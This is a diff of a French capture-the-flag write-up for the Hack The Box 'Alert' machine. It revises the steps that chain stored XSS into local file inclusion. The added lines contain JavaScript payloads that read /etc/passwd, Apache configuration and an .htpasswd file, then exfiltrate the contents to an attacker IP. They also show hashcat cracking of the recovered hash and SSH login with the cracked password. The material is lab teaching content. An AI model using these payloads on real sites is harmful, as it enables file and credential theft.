@@ -713,17 +713,14 @@ Une première étape consiste à vérifier que tu peux appeler la page `messages
 Pour cela, crée un fichier `fetch-test.md` avec le contenu suivant :
 
 ```markdown
-# Test fetch
+# Message test
 
 <script>
 fetch('http://alert.htb/messages.php')
-  .then(r => r.text())
-  .then(data => {
-    new Image().src = 'http://10.10.16.93:8000/?ok=' + data.length;
-  })
-  .catch(err => {
-    new Image().src = 'http://10.10.16.93:8000/?err=1';
-  });
+.then(r => r.text())
+.then(d => {
+  new Image().src="http://10.10.16.93:8000/msg?d="+btoa(d);
+});
 </script>
 ```
 
@@ -789,23 +786,30 @@ fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
 </script>
 ```
 
-Ce code demande au navigateur de l’administrateur d’ouvrir le fichier `/etc/passwd`, puis d’envoyer son contenu vers ta machine Kali.
+Ici, le code demande au navigateur de l’administrateur d’ouvrir le fichier `/etc/passwd` via `messages.php`, puis d’envoyer son contenu vers ta machine Kali.
 
-Dans ton terminal, tu observes alors une nouvelle requête contenant les données encodées.
-
-Après décodage, tu obtiens le contenu du fichier `/etc/passwd`, par exemple :
+Lorsque ce fichier Markdown est consulté, une requête est envoyée vers ton serveur :
 
 ```bash
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
+10.129.xxx.xxx - - [date] "GET /?d=PHByZT5yb290Ong6MDow...
 ```
 
-Cela confirme que :
+Le contenu est encodé en Base64 afin de pouvoir être transmis dans l’URL. Après décodage, tu obtiens :
 
-- le paramètre `file` permet de lire des fichiers arbitraires
-- cette lecture est effectuée avec les droits de l’administrateur
-- il est possible d’exfiltrer le contenu de ces fichiers vers ta machine
+```bash
+<pre>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+albert:x:1000:1000:albert:/home/albert:/bin/bash
+david:x:1001:1002:,,,:/home/david:/bin/bash
+</pre>
+```
+
+Ce test confirme que :
+
+- le paramètre `file` permet de lire des fichiers arbitraires sur le serveur
+- cette lecture est effectuée dans le navigateur de l’administrateur, donc avec ses droits
+- le contenu peut être exfiltré vers ta machine
 
 Tu es donc en présence d’une vulnérabilité de type **Local File Inclusion (LFI)** exploitable via la XSS.
 
@@ -813,25 +817,46 @@ Tu es donc en présence d’une vulnérabilité de type **Local File Inclusion (
 
 ### Découverte d’un point d’entrée LFI
 
-La réponse obtenue révèle la présence de paramètres intéressants :
+À ce stade, grâce à la XSS et à notre mécanisme d’exfiltration (`fetch()` + `new Image()`), nous avons validé que nous pouvions lire des fichiers locaux sur le serveur via le paramètre `file` de `messages.php`.
 
-```
-messages.php?file=...
-```
+Après un premier test sur `/etc/passwd`, dont le rendu reste inexploitable (`<pre><pre>`), nous orientons notre analyse vers des fichiers de configuration plus pertinents.
 
-Cela suggère que l’application permet de lire des fichiers côté serveur.
+Nous ciblons alors la configuration Apache avec `/etc/apache2/apache2.conf`, qui révèle l’utilisation de fichiers inclus :
 
-On teste alors une inclusion de fichier classique :
-
-```
-../../../../etc/passwd
+```bash
+# Include the virtual host configurations:
+IncludeOptional sites-enabled/*.conf
 ```
 
-Payload final :
 
+
+Cette directive nous indique où poursuivre notre exploration.
+
+En accédant à `/etc/apache2/sites-enabled/000-default.conf`, nous obtenons la configuration des VirtualHosts, dont un élément particulièrement intéressant :
+
+```bash
+AuthUserFile /var/www/statistics.alert.htb/.htpasswd
 ```
+
+Cette information indique l’existence d’un fichier `.htpasswd` contenant des identifiants protégés, accessible localement sur le serveur.
+
+Nous disposons donc maintenant d’une cible concrète à exploiter via notre lecture de fichiers.
+
+### Lecture du fichier `.htpasswd`
+
+En exploitant notre capacité de lecture de fichiers, nous ciblons directement le fichier identifié précédemment :
+
+```bash
+/var/www/statistics.alert.htb/.htpasswd
+```
+
+Nous adaptons notre payload afin d’exfiltrer son contenu :
+
+```markdown
+# Fetch LFI .htpasswd
+
 <script>
-fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
+fetch('http://alert.htb/messages.php?file=../../../../../var/www/statistics.alert.htb/.htpasswd')
   .then(r => r.text())
   .then(data => {
     new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
@@ -839,28 +864,78 @@ fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
 </script>
 ```
 
-------
+Après décodage de la réponse reçue, nous obtenons :
 
-### Validation de la lecture de fichiers
-
-Après envoi du lien à l’administrateur, on reçoit sur notre serveur le contenu encodé.
-
-Une fois décodé, on obtient :
-
-```
-root:x:0:0:root:/root:/bin/bash
-...
+```bash
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
 ```
 
-👉 La vulnérabilité est confirmée :
+Ce format correspond à un fichier `.htpasswd`, utilisé pour l’authentification HTTP Basic.
 
-- XSS stockée → exécution côté admin
-- - LFI via `messages.php`
-- = **lecture arbitraire de fichiers sur le serveur**
+On identifie :
 
-------
+- utilisateur : `albert`
+- hash : `$apr1$` (MD5 Apache)
 
-### Conclusion de la prise de pied
+Nous allons maintenant tenter de casser ce hash afin d’obtenir les identifiants en clair.
+
+### Cracking du hash `.htpasswd`
+
+LLe contenu du fichier `.htpasswd` nous fournit le hash suivant :
+
+```bash
+albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
+```
+
+Le préfixe `$apr1$` indique un hash Apache MD5, typiquement utilisé pour l’authentification HTTP Basic via `.htpasswd`.
+
+Nous le plaçons dans un fichier `hash.txt`, puis nous utilisons `hashcat` avec le mode correspondant et la wordlist `rockyou.txt` :
+
+```bash
+echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
+```
+
+```bash
+hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+Le mot de passe est retrouvé très rapidement :
+
+```bash
+$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited
+```
+
+Nous obtenons donc les identifiants suivants :
+
+```text
+albert:manchesterunited
+```
+
+Ces identifiants vont ensuite être testés sur les services accessibles, en commençant logiquement par la zone protégée du vhost `statistics.alert.htb`.
+
+### Test des identifiants
+
+On a récupéré les identifiants suivants :
+
+```bash
+albert:manchesterunited
+```
+
+Ces identifiants proviennent d’un fichier `.htpasswd`, donc initialement destinés à une authentification web. Cependant, en CTF, **il est fréquent que les identifiants soient réutilisés sur plusieurs services**.
+
+On teste donc leur réutilisation sur le service SSH :
+
+```bash
+ssh albert@alert.htb
+```
+
+L’authentification fonctionne.
+
+**On obtient ainsi un accès SSH en tant qu’utilisateur `albert`.**
+
+
+
+Conclusion de la prise de pied
 
 À ce stade, on dispose :
 
